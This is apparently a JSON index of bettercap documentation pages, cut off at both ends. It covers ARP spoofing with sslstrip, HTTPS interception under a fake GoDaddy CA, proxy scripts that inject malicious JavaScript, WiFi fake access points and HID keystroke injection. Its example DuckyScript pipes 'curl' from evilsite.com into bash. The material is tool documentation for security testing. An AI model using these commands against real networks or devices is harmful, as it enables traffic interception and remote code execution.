wifi.recon modules to create a WiFi scanner (performing channel hopping on every supported frequency):\n\u0026gt; set ticker.commands \u0026quot;clear; wifi.show\u0026quot;; wifi.recon on; ticker on  Sort by BSSID and filter for BSSIDs starting with F4:\n\u0026gt; set wifi.show.sort bssid asc \u0026gt; set wifi.show.filter ^F4 \u0026gt; wifi.show  Only recon on channels 1, 2 and 3:\n\u0026gt; wifi.recon.channel 1,2,3; wifi.recon on  Will send management beacons as the fake access point \u0026ldquo;Banana\u0026rdquo; with BSSID DE:AD:BE:EF:DE:AD on channel 5 without encryption:\n\u0026gt; set wifi.ap.ssid Banana \u0026gt; set wifi.ap.bssid DE:AD:BE:EF:DE:AD \u0026gt; set wifi.ap.channel 5 \u0026gt; set wifi.ap.encryption false \u0026gt; wifi.recon on; wifi.ap  "
},
{
	"uri": "https://bettercap.org/installation/",
	"title": "Installation",
	"tags": [],
	"description": "",
	"content": " bettercap supports GNU/Linux, BSD, Android, Apple macOS and the Microsoft Windows operating systems - depending if you want to install the latest stable release or the bleeding edge from the GitHub repository, you have several choices.\nPrecompiled Binaries For every new release, we distribute bettercap\u0026rsquo;s precompiled binaries. In order to be able to use them, you\u0026rsquo;ll need the following dependencies on your system:\n libpcap libusb-1.0 (required by the HID module) libnetfilter-queue (on Linux only, required by the packet.proxy module)  Using Docker BetterCAP is containerized using Alpine Linux - a security-oriented, lightweight Linux distribution based on musl libc and busybox. The resulting Docker image is relatively small and easy to manage the dependencies. Since it is using a multi-stage build, a Docker version greater than 17.05 is required.\nTo pull latest stable version of the image:\ndocker pull bettercap/bettercap  To pull latest source code build of the image:\ndocker pull bettercap/dev  To run:\ndocker run -it --privileged --net=host bettercap/bettercap -h  Compiling from Sources In order to compile bettercap from sources, make sure that:\n You have a correctly configured Go \u0026gt;= 1.8 environment. $GOPATH is defined and $GOPATH/bin is in $PATH.  You\u0026rsquo;ll also need to install the dependencies:\n build-essential libpcap-dev libusb-1.0-dev (required by the HID module) libnetfilter-queue-dev (on Linux only, required by the packet.proxy module)  Once you\u0026rsquo;ve met this conditions, you can run the following commands to compile and install bettercap in /usr/local/bin/bettercap:\ngo get github.com/bettercap/bettercap cd $GOPATH/src/github.com/bettercap/bettercap make build sudo make install  Compiling on Android Install Termux and from its prompt type:\npkg install root-repo pkg install golang git libpcap-dev go get -u github.com/bettercap/bettercap  Once the build process is concluded, the binary will be located in go/bin/bettercap.\n"
},
{
	"uri": "https://bettercap.org/modules/ethernet/proxies/http.proxy/",
	"title": "http.proxy",
	"tags": [],
	"description": "",
	"content": " A full featured HTTP transparent proxy that can be scripted using javascript modules. If used together with a spoofer, all HTTP traffic will be redirected to it and it will automatically handle port redirections as needed.\nCommands http.proxy on Start the HTTP proxy.\nhttp.proxy off Stop the HTTP proxy.\nParameters    parameter default description     http.port 80 HTTP port to redirect when the proxy is activated.   http.proxy.address \u0026lt;interface address\u0026gt; Address to bind the HTTP proxy to.   http.proxy.port 8080 Port to bind the HTTP proxy to.   http.proxy.sslstrip false Enable or disable SSL stripping.   http.proxy.script  Path of a proxy module script.   http.proxy.injectjs  URL, path or javascript code to inject into every HTML page.    Modules The http.proxy and https.proxy modules can be scripted using javascript files that must declare at least one of the following functions:\n// called when the script is loaded function onLoad() { } // called when the request is received by the proxy // and before it is sent to the real server. function onRequest(req, res) { } // called when the request is sent to the real server // and a response is received function onResponse(req, res) { } // called every time an unknown session command is typed, // proxy modules can optionally handle custom commands this way: function onCommand(cmd) { if( cmd == \u0026quot;test\u0026quot; ) { /* * Custom session command logic here. */ // tell the session we handled this command return true } }  Modules can change the req request and res response objects, for instance the web-override.cap caplet is using the onRequest function in order to override every request before it is executed with a fake response:\nfunction onRequest(req, res) { res.Status = 200; res.ContentType = \u0026quot;text/html\u0026quot;; res.Body = readFile(\u0026quot;caplets/www/index.html\u0026quot;); headers = res.Headers.split(\u0026quot;\\r\\n\u0026quot;) for (var i = 0; i \u0026lt; headers.length; i++) { header_name = headers[i].replace(/:.*/, \u0026quot;\u0026quot;) res.RemoveHeader(header_name); } res.SetHeader(\u0026quot;Connection\u0026quot;, \u0026quot;close\u0026quot;); }  The login-man-abuse.cap caplet instead will use the onResponse handler to inject its malicious javascript file in every html response:\nfunction onResponse(req, res) { if( res.ContentType.indexOf('text/html') == 0 ){ var body = res.ReadBody(); if( body.indexOf('\u0026lt;/head\u0026gt;') != -1 ) { res.Body = body.replace( '\u0026lt;/head\u0026gt;', '\u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt;' + \u0026quot;\\n\u0026quot; + AbuserJavascript + '\u0026lt;/script\u0026gt;' + '\u0026lt;/head\u0026gt;' ); } } }  Builtin Functions Modules can use the following builtin functions.\n   function description     readDir(\u0026quot;/path/\u0026quot;) Return the contents of a directory as a string array.   readFile(\u0026quot;/path/to/file\u0026quot;) Return the contents of a file as a string.   writeFile(\u0026quot;/path/to/file\u0026quot;, \u0026quot;hello world\u0026quot;) Write the string hello world to a file, returns null or an error message.   log_debug(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be DEBUG).   log_info(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be INFO).   log_warn(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be WARNING).   log_error(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be ERROR).   log_fatal(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be FATAL).   log(\u0026quot;message\u0026quot;) Shortcut for log_info(\u0026quot;message\u0026quot;).   btoa(\u0026quot;message\u0026quot;) Encode a message to base64.   atob(\u0026quot;bWVzc2FnZQ==\u0026quot;) Decode a message from base64.   env(\u0026quot;iface.ipv4\u0026quot;) Read a variable.   env(\u0026quot;foo\u0026quot;, \u0026quot;bar\u0026quot;) Set a variable.    Examples Will ARP spoof the whole network, enable sslstrip and inject a \u0026ldquo;Hello World\u0026rdquo; javascript alert to every HTML page being visited:\nset http.proxy.injectjs alert(\u0026quot;Hello World\u0026quot;) set http.proxy.sslstrip true http.proxy on arp.spoof on  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/syn.scan/",
	"title": "syn.scan",
	"tags": [],
	"description": "",
	"content": " A module to perform SYN port scanning, as open ports are discovered the tcp-ports meta field of the endpoints will be filled and it will be shown in the new.show view if net.show.meta is set to true.\nCommands syn.scan IP-RANGE START-PORT END-PORT? Perform a syn port scanning against an IP address within the provided ports range.\nsyn.scan stop Stop the current syn scanning session.\nsyn.scan.progress Print progress of the current syn scanning session.\nParameters    parameter default description     syn.scan.show-progress-every 1 Period in seconds for the scanning progress reporting.    Examples Scan a single ip for ports 1 to 1000:\n\u0026gt; syn.scan 192.168.1.3 1 1000  Scan several addresses for port 22:\n\u0026gt; syn.scan 192.168.1.1-50 22  Scan the entire subnet for ports 1 to 10000:\n\u0026gt; syn.scan 192.168.1.0/24 1 10000  "
},
{
	"uri": "https://bettercap.org/modules/core/update/",
	"title": "update",
	"tags": [],
	"description": "",
	"content": " A module to check for bettercap\u0026rsquo;s updates.\nCommands update.check on Check latest available stable version and compare it with the one being used.\n"
},
{
	"uri": "https://bettercap.org/modules/hid/",
	"title": "HID on 2.4Ghz",
	"tags": [],
	"description": "",
	"content": " This module, which is a port of Bastille\u0026rsquo;s mousejack attack, performs scanning and frames injection for HID devices on the 2.4Ghz spectrum, using Nordic Semiconductor nRF24LU1+ based USB dongles and Bastille\u0026rsquo;s RFStorm firmware.\nThe module will work with one of the devices supported by RFStorm:\n CrazyRadio PA USB dongle SparkFun nRF24LU1+ breakout board Logitech Unifying dongle (model C-U0007, Nordic Semiconductor based)  In order for this module to work, you need to make sure you installed the Bastille’s RFStorm firmware on one of the supported devices.\n Once flashed with the proper firmware and connected to your computer, dmesg should report the device as:\nusb 3-1.3: new full-speed USB device number 8 using xhci_hcd usb 3-1.3: New USB device found, idVendor=1915, idProduct=0102 usb 3-1.3: New USB device strings: Mfr=1, Product=2, SerialNumber=0 usb 3-1.3: Product: Research Firmware usb 3-1.3: Manufacturer: RFStorm  The attack is known to support detection and DuckyScript injection for the following devices:\n Microsoft Wireless Keyboard 800 Microsoft Wireless Mouse 1000 Microsoft Wireless Mobile Mouse 3500 Microsoft All-In-One Media Keyboard Microsoft Sculpt Ergonomic Mouse Logitech Wireless Touch Keyboard K400r Logitech Marathon M705 Mouse Logitech Wave M510 Mouse Logitech Wireless Gaming Mouse G700s Logitech Wireless M325 Mouse Logitech K750 Wireless Keyboard Logitech K320 Wireless Keyboard Dell KM636 Wireless Mouse and Keyboard AmazonBasics MG-0975 Wireless Mouse  Commands hid.recon on Start scanning for HID devices on the 2.4Ghz spectrum.\nhid.recon off Stop scanning for HID devices on the 2.4Ghz spectrum.\nhid.show Show a list of detected HID devices on the 2.4Ghz spectrum.\nhid.sniff ADDRESS Start sniffing a specific ADDRESS in order to collect payloads, use \u0026lsquo;clear\u0026rsquo; to stop collecting.\nhid.inject ADDRESS LAYOUT FILENAME Parse the DuckyScript FILENAME and inject it as HID frames spoofing the device ADDRESS, using the LAYOUT keyboard mapping (available layouts: BE BR CA CH DE DK ES FI FR GB HR IT NO PT RU SI SV TR US).\nParameters    parameter default description     hid.lna true If true, enable the LNA power amplifier for CrazyRadio devices.   hid.hop.period 100 Time in milliseconds to stay on each channel before hopping to the next one.   hid.ping.period 100 Time in milliseconds to attempt to ping a device on a given channel while in sniffer mode.   hid.sniff.period 500 Time in milliseconds to automatically sniff payloads from a device, once it\u0026rsquo;s detected, in order to determine its type.   hid.force.type logitech If the device is not visible (if you want to talk directly to a dongle without connected devices) or its type has not being detected, force the device type to this value. Accepted values: logitech, amazon, microsoft.   hid.show.filter  Defines a regular expression filter for hid.show.   hid.show.sort mac desc Defines sorting field (mac, seen) and direction (asc or desc) for hid.show.   hid.show.limit 0 Defines limit for hid.show.    Examples Enable HID discovery, use the ticker module to display detected devices, wait for the device 32:26:9f:a4:08 to be detected and inject the ducky.txt script as HID frames using the US keyboard layout:\n\u0026gt; set ticker.commands clear; hid.show; events.show 10 \u0026gt; hid.recon on \u0026gt; ticker on # ... wait for the device to be detected, using `hid.show` ... \u0026gt; hid.inject 32:26:9f:a4:08 US ducky.txt  Send the ducky.txt script keystrokes to the dongle with address 32:26:9f:a4:08 forcing its type to logitech and without waiting for any connected device to be visible:\n\u0026gt; set hid.force.type logitech \u0026gt; hid.recon on \u0026gt; hid.inject 32:26:9f:a4:08 US ducky.txt  Example ducky.txt (for a complete list of available commands see the documentation):\nGUI SPACE DELAY 200 STRING Terminal ENTER DELAY 500 STRING curl -L http://www.evilsite.com/commands.sh | bash ENTER  "
},
{
	"uri": "https://bettercap.org/basic-usage/",
	"title": "Basic Usage",
	"tags": [],
	"description": "",
	"content": " Once started the tool with sudo bettercap (click here for the list of command line arguments), you\u0026rsquo;ll be presented with an interactive session a la Metasploit where you\u0026rsquo;ll be able to run commands, enable or disable modules, get or set parameters and so on.\nEach command can either be executed singularly, or concatenated by the ; operator, for instance, instead of typing:  clear net.show  You can simply type:  clear; net.show\n Functionalities are organized in core commands (basic commands you\u0026rsquo;ll need to perform operations such as setting a session parameter, getting its value, clearing the screen, etc) and session modules (each will provide a set of feature specific sub commands and use some session parameters for its configuration).\nCaplets Other than executing commands manually one by one, it is possible to script your interactive session using caplets. Caplets (script files with a .cap extension) are a powerful way to automate your workflow: think about them as the Metasploit\u0026rsquo;s .rc files, where each line of the file is a command that\u0026rsquo;ll be executed at runtime.\nFor instance, a simple caplet that sets the ticker.commands parameter and enables the net.probe and ticker modules would be:\nset ticker.commands 'clear; net.show; events.show 10' net.probe on ticker on  Once saved as an example.cap file, you\u0026rsquo;ll be able to load and execute it via:\nsudo bettercap -caplet /path/to/example.cap  It is also possible to load a caplet by name, without its path and extension:\nsudo bettercap -caplet example  In this case the search order will be:\n ./example.cap ./caplets/example.cap Any folder in the environment variable $CAPSPATH (values are separated by :, like for $PATH). /usr/local/share/bettercap/caplets/example.cap (the default path where caplets are installed).  You can install (or update) the predefined caplets (hosted in this repository) by using the caplet module, either from the command line:\nsudo bettercap -eval \u0026quot;caplets.update; q\u0026quot;  Or simply from the interactive session:\n\u0026gt; caplets.update  You can then check what\u0026rsquo;s been installed in /usr/local/share/bettercap/caplets/ with the command:\n\u0026gt; caplets.show  Command Line Arguments The basic command line arguments ( bettercap -h ) are:\n-autostart MODULES A comma separated list of modules that are automatically started (default to events.stream, net.recon).\n-caplet FILENAME Read commands from this file and execute them in the interactive session.\n-eval COMMANDS Run one or more commands separated by ; in the interactive session, used to set variables via command line.\n-iface INTERFACE Network interface to bind to, if empty the default interface will be auto selected (accepts interface name, ip or mac address)\n-gateway-override ADDRESS Use the provided IP address instead of the default gateway. If not specified or invalid, the default gateway will be auto detected and used.\n-no-history Disable the interactive session history file ~/.bettercap.history.\n-no-colors Disable terminal colors and effects.\n-env-file FILENAME Preload the parameters values from this file if found, set to empty to disable environment persistance (default ~/bettercap.env).\n-silent Suppress all logs which are not errors.\n-cpu-profile FILENAME Write a CPU profile file when exiting (used for debugging and benchmarking).\n-mem-profile FILENAME Write memory profile file when exiting (used for debugging and benchmarking).\n-debug Enable debug messages, must be used to report bugs.\nCore Commands help Will list all available commands and print the name of each module and its status (running or not running).\nhelp MODULE_NAME Will print the module specific help menu, with its sub commands and parameters.\nactive Show which modules are running and their parameters.\nquit or q Close the session and exit.\nsleep SECONDS Sleep for the given amount of seconds.\nget PARAMETER Get the value of the specified parameter, use * for all.\nset PARAMETER VALUE Set the value of PARAMETER to VALUE, use \u0026quot;\u0026quot; or '' to clear its contents.\nread PARAMETER PROMPT Show a PROMPT to ask the user for input that will be saved inside PARAMETER.\nclear Clear the screen.\ninclude CAPLET Load and run this caplet in the current session, the same behaviour can be achieved by just specifying the caplet name as a command.\n!COMMAND Execute a shell command and print its output into the session.\nalias MAC NAME Assign an alias to a given endpoint given its MAC address (will be persistent on ~/bettercap.aliases).\nBeing persisted on disk, aliases are shared across each module and bettercap session. This means that if you set an alias for a computer while on the same network, the same alias will be shown and used, for instance, by the WiFi modules when resolving wireless stations BSSID (you\u0026rsquo;ll see who\u0026rsquo;s connecting to what).\n Customizing the Prompt The interactive session prompt can be modified by setting the $ variable, for instance this:\nset $ something  Will set the prompt to the string something. You can also access parameters and use colors/effects by using the proper syntax and operators as you can see from the $ parameter default value:\n\u0026gt; get $ {by}{fw}{cidr} {fb}\u0026gt; {env.iface.ipv4} {reset} {bold}» {reset}  The available effects are:\n   Operator Description     {bold} Set text to bold.   {dim} Set dim effect on text.   {r} Set text foreground color to red.   {g} Set text foreground color to red.   {b} Set text foreground color to red.   {y} Set text foreground color to red.   {fb} Set text foreground color to black.   {fw} Set text foreground color to white.   {bdg} Set text background color to dark gray.   {br} Set text background color to red.   {bg} Set text background color to green.   {by} Set text background color to yellow.   {blb} Set text background color to light blue.   {reset} Reset text effects (added by default at the end of the prompt if not specified).    There are also other operators you can use in order to access specific information about the session.\n   Operator Description     {cidr} Selected interface subnet CIDR.   {net.sent} Number of bytes being sent by the tool on the network.   {net.sent.human} Number of bytes being sent by the tool on the network (human readable form).   {net.errors} Number of errors while sending packets.   {net.received} Number of bytes being sniffed from the tool on the network.   {net.received.human} Number of bytes being sniffed from the tool from the network (human readable form).   {net.packets} Number of packets being sniffed by the tool from the network.    And finally, you can access and use any variable that has been declared in the interactive session using the {env.NAME-OF-THE-VAR} operator, for instance, the default prompt is using {env.iface.ipv4} that is replaced by the iface.ipv4 session variable contents ( you can check it using the get iface.ipv4 command ).\nExamples To disable net.recon (if for instance you\u0026rsquo;re only using WiFi or BLE related modules):\nsudo bettercap -autostart \u0026quot;events.stream\u0026quot;  Which is equivalent to:\nsudo bettercap -eval \u0026quot;net.recon off\u0026quot;  Set the arp.spoof.targets parameter and enable the arp.spoof module:\nsudo bettercap -eval \u0026quot;set arp.spoof.targets 192.168.1.20; arp.spoof on\u0026quot;  To quickly get the help menu of a module and quit bettercap (basically like a man command), you can use the -eval argument, for example:\nsudo bettercap -eval \u0026quot;help net.recon; q\u0026quot;  Ask the user to fill the arp.spoof.targets parameter:\n\u0026gt; read arp.spoof.targets \u0026quot;Select the target to spoof: \u0026quot;  Set the alias \u0026ldquo;MY IPAD\u0026rdquo; to the device with MAC address DE:AD:DE:AD:BE:EF:\n\u0026gt; alias DE:AD:DE:AD:BE:EF MY IPAD  "
},
{
	"uri": "https://bettercap.org/modules/ethernet/proxies/https.proxy/",
	"title": "https.proxy",
	"tags": [],
	"description": "",
	"content": " A full featured HTTPS transparent proxy that can be scripted using javascript modules. If used together with a spoofer, all HTTPS traffic will be redirected to it and it will automatically handle port redirections as needed.\nWhen a new TLS connection is being proxied, bettercap will fetch the original certificate from the target host and resign on the fly the full chain using its own CA.\n Commands https.proxy on Start the HTTPS proxy.\nhttps.proxy off Stop the HTTPS proxy.\nParameters    parameter default description     https.port 443 HTTPS port to redirect when the proxy is activated.   https.proxy.address \u0026lt;interface address\u0026gt; Address to bind the HTTPS proxy to.   https.proxy.port 8083 Port to bind the HTTPS proxy to.   https.proxy.certificate ~/.bettercap-ca.cert.pem HTTPS proxy certification authority TLS certificate file.   https.proxy.key ~/.bettercap-ca.key.pem HTTPS proxy certification authority TLS key file.   https.proxy.certificate.bits 4096 Number of bits of the RSA private key of the generated HTTPS certificate authority.   https.proxy.certificate.commonname Go Daddy Secure Certificate Authority - G2 Common Name field of the generated HTTPS certificate authority.   https.proxy.certificate.country US Country field of the generated HTTPS certificate authority.   https.proxy.certificate.locality Scottsdale Locality field of the generated HTTPS certificate authority.   https.proxy.certificate.organization GoDaddy.com, Inc. Organization field of the generated HTTPS certificate authority.   https.proxy.certificate.organizationalunit https://certs.godaddy.com/repository/ Organizational Unit field of the generated HTTPS certificate authority.   https.proxy.sslstrip false Enable or disable SSL stripping.   https.proxy.script  Path of a proxy module script.   https.proxy.injectjs  URL, path or javascript code to inject into every HTML page.    Modules The http.proxy and https.proxy modules can be scripted using javascript files that must declare at least one of the following functions:\n// called when the script is loaded function onLoad() { } // called when the request is received by the proxy // and before it is sent to the real server. function onRequest(req, res) { } // called when the request is sent to the real server // and a response is received function onResponse(req, res) { } // called every time an unknown session command is typed, // proxy modules can optionally handle custom commands this way: function onCommand(cmd) { if( cmd == \u0026quot;test\u0026quot; ) { /* * Custom session command logic here. */ // tell the session we handled this command return true } }  Modules can change the req request and res response objects, for instance the web-override.cap caplet is using the onRequest function in order to override every request before it is executed with a fake response:\nfunction onRequest(req, res) { res.Status = 200; res.ContentType = \u0026quot;text/html\u0026quot;; res.Body = readFile(\u0026quot;caplets/www/index.html\u0026quot;); headers = res.Headers.split(\u0026quot;\\r\\n\u0026quot;) for (var i = 0; i \u0026lt; headers.length; i++) { header_name = headers[i].replace(/:.*/, \u0026quot;\u0026quot;) res.RemoveHeader(header_name); } res.SetHeader(\u0026quot;Connection\u0026quot;, \u0026quot;close\u0026quot;); }  The login-man-abuse.cap caplet instead will use the onResponse handler to inject its malicious javascript file in every html response:\nfunction onResponse(req, res) { if( res.ContentType.indexOf('text/html') == 0 ){ var body = res.ReadBody(); if( body.indexOf('\u0026lt;/head\u0026gt;') != -1 ) { res.Body = body.replace( '\u0026lt;/head\u0026gt;', '\u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt;' + \u0026quot;\\n\u0026quot; + AbuserJavascript + '\u0026lt;/script\u0026gt;' + '\u0026lt;/head\u0026gt;' ); } } }  Builtin Functions Modules can use the following builtin functions.\n   function description     readDir(\u0026quot;/path/\u0026quot;) Return the contents of a directory as a string array.   readFile(\u0026quot;/path/to/file\u0026quot;) Return the contents of a file as a string.   writeFile(\u0026quot;/path/to/file\u0026quot;, \u0026quot;hello world\u0026quot;) Write the string hello world to a file, returns null or an error message.   log_debug(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be DEBUG).   log_info(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be INFO).   log_warn(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be WARNING).   log_error(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be ERROR).   log_fatal(\u0026quot;message\u0026quot;) Log a message in the interactive session (its level will be FATAL).   log(\u0026quot;message\u0026quot;) Shortcut for log_info(\u0026quot;message\u0026quot;).   btoa(\u0026quot;message\u0026quot;) Encode a message to base64.   atob(\u0026quot;bWVzc2FnZQ==\u0026quot;) Decode a message from base64.   env(\u0026quot;iface.ipv4\u0026quot;) Read a variable.   env(\u0026quot;foo\u0026quot;, \u0026quot;bar\u0026quot;) Set a variable.    "
},
{
	"uri": "https://bettercap.org/modules/ethernet/wol/",
	"title": "wake on lan",
	"tags": [],
	"description": "",
	"content": " A module to send Wake On LAN packets in broadcast or to a specific MAC.\nCommands wol.eth MAC Send a WOL as a raw ethernet packet of type 0x0847 (if no MAC is specified, ff:ff:ff:ff:ff:ff will be used).\nwol.udp MAC Send a WOL as an IPv4 broadcast packet to UDP port 9 (if no MAC is specified, ff:ff:ff:ff:ff:ff will be used).\n"
},
{
	"uri": "https://bettercap.org/modules/core/api.rest/",
	"title": "api.rest",
	"tags": [],
	"description": "",
	"content": " A RESTful API server to orchestrate and interact with the current interactive session, starts on HTTP and unauthenticated by default, can be switched to HTTPS and basic auth by using the proper parameters.\nCommands api.rest on Start the REST API server.\napi.rest off Stop the REST API server.\nParameters    parameter default description     api.rest.certificate  API TLS certificate (will be auto generated if not existing), fill to enable HTTPS.   api.rest.key  API TLS key (will be auto generated if not existing), fill to enable HTTPS.   api.rest.certificate.bits 4096 Number of bits of the RSA private key of the generated HTTPS certificate.   api.rest.certificate.commonname bettercap Common Name field of the generated HTTPS certificate.   api.rest.certificate.country US Country field of the generated HTTPS certificate.   api.rest.certificate.locality  Locality field of the generated HTTPS certificate.   api.rest.certificate.organization bettercap devteam Organization field of the generated HTTPS certificate.   api.rest.certificate.organizationalunit https://bettercap.org/ Organizational Unit field of the generated HTTPS certificate.   api.rest.address \u0026lt;interface address\u0026gt; Address to bind the API REST server to.   api.rest.port 8081 Port to bind the API REST server to.   api.rest.username  API HTTP basic auth username.   api.rest.password  API HTTP basic auth password.   api.rest.websocket false If true the /api/events route will be available as a websocket endpoint instead of HTTP.   api.rest.alloworigin * Value of the Access-Control-Allow-Origin header of the API server.    Routes Clients can authenticate using HTTP basic authentication, these are the available API routes.\nGET /api/session Get a JSON of the state of the current session, example response:\n  Expand for the example JSON   { \u0026quot;options\u0026quot;: { \u0026quot;InterfaceName\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Caplet\u0026quot;: \u0026quot;../caplets/netmon.cap\u0026quot;, \u0026quot;Debug\u0026quot;: false, \u0026quot;Silent\u0026quot;: false, \u0026quot;NoHistory\u0026quot;: false, \u0026quot;Commands\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;CpuProfile\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;MemProfile\u0026quot;: \u0026quot;\u0026quot; }, \u0026quot;interface\u0026quot;: { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.17\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;enx18fffffff\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Dell\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.565053179+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.565053179+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, \u0026quot;gateway\u0026quot;: { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.1\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;gateway.\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Technicolor\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.649440315+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.649440315+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, \u0026quot;env\u0026quot;: { \u0026quot;data\u0026quot;: { \u0026quot;$\u0026quot;: \u0026quot;{by}{fw}{cidr} {fb}\\u003e {env.iface.ipv4} {reset} {bold}» {reset}\u0026quot;, \u0026quot;api.rest.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;api.rest.certificate\u0026quot;: \u0026quot;~/.bcap-api.rest.certificate.pem\u0026quot;, \u0026quot;api.rest.key\u0026quot;: \u0026quot;~/.bcap-api.rest.key.pem\u0026quot;, \u0026quot;api.rest.password\u0026quot;: \u0026quot;bcap\u0026quot;, \u0026quot;api.rest.port\u0026quot;: \u0026quot;8083\u0026quot;, \u0026quot;api.rest.username\u0026quot;: \u0026quot;bcap\u0026quot;, \u0026quot;arp.spoof.targets\u0026quot;: \u0026quot;\\u003centire subnet\\u003e\u0026quot;, \u0026quot;dhcp6.spoof.domains\u0026quot;: \u0026quot;microsoft.com, goole.com, facebook.com, apple.com, twitter.com\u0026quot;, \u0026quot;dns.spoof.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;dns.spoof.all\u0026quot;: \u0026quot;false\u0026quot;, \u0026quot;dns.spoof.domains\u0026quot;: \u0026quot;*\u0026quot;, \u0026quot;events.stream.filter\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;gateway.address\u0026quot;: \u0026quot;192.168.1.1\u0026quot;, \u0026quot;gateway.mac\u0026quot;: \u0026quot;e0:b9:e5:17:22:e4\u0026quot;, \u0026quot;http.port\u0026quot;: \u0026quot;80\u0026quot;, \u0026quot;http.proxy.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;http.proxy.port\u0026quot;: \u0026quot;8080\u0026quot;, \u0026quot;http.proxy.script\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;http.server.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;http.server.path\u0026quot;: \u0026quot;.\u0026quot;, \u0026quot;http.server.port\u0026quot;: \u0026quot;80\u0026quot;, \u0026quot;https.port\u0026quot;: \u0026quot;443\u0026quot;, \u0026quot;https.proxy.address\u0026quot;: \u0026quot;\\u003cinterface address\\u003e\u0026quot;, \u0026quot;https.proxy.certificate\u0026quot;: \u0026quot;~/.bettercap-ca.cert.pem\u0026quot;, \u0026quot;https.proxy.key\u0026quot;: \u0026quot;~/.bettercap-ca.key.pem\u0026quot;, \u0026quot;https.proxy.port\u0026quot;: \u0026quot;8083\u0026quot;, \u0026quot;https.proxy.script\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;iface.index\u0026quot;: \u0026quot;6\u0026quot;, \u0026quot;iface.ipv4\u0026quot;: \u0026quot;192.168.1.17\u0026quot;, \u0026quot;iface.ipv6\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;iface.mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;iface.name\u0026quot;: \u0026quot;enx18fffffff\u0026quot;, \u0026quot;log.debug\u0026quot;: \u0026quot;false\u0026quot;, \u0026quot;log.silent\u0026quot;: \u0026quot;false\u0026quot;, \u0026quot;mac.changer.address\u0026quot;: \u0026quot;\\u003crandom mac\\u003e\u0026quot;, \u0026quot;mac.changer.iface\u0026quot;: \u0026quot;\\u003cinterface name\\u003e\u0026quot;, \u0026quot;net.probe.throttle\u0026quot;: \u0026quot;10\u0026quot;, \u0026quot;net.sniff.filter\u0026quot;: \u0026quot;not arp\u0026quot;, \u0026quot;net.sniff.local\u0026quot;: \u0026quot;false\u0026quot;, \u0026quot;net.sniff.output\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;net.sniff.regexp\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;net.sniff.source\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;net.sniff.verbose\u0026quot;: \u0026quot;true\u0026quot;, \u0026quot;ticker.commands\u0026quot;: \u0026quot;clear; net.show\u0026quot;, \u0026quot;ticker.period\u0026quot;: \u0026quot;1\u0026quot;, \u0026quot;wifi.recon.channel\u0026quot;: \u0026quot;\u0026quot; } }, \u0026quot;lan\u0026quot;: { \u0026quot;hosts\u0026quot;: [{ \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.33\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;nas\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;Noon Technology Co.\u0026quot;, \u0026quot;first_seen\u0026quot;: \u0026quot;2018-02-23T06:28:43.661773691+01:00\u0026quot;, \u0026quot;last_seen\u0026quot;: \u0026quot;2018-02-23T06:29:10.402653849+01:00\u0026quot;, \u0026quot;meta\u0026quot;: { \u0026quot;values\u0026quot;: {} } }, { \u0026quot;ipv4\u0026quot;: \u0026quot;192.168.1.29\u0026quot;, \u0026quot;ipv6\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;mac\u0026quot;: \u0026quot;-\u0026quot;, \u0026quot;hostname\u0026quot;: \u0026quot;osxvm\u0026quot;, \u0026quot;alias\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;PCS Systemtechnik 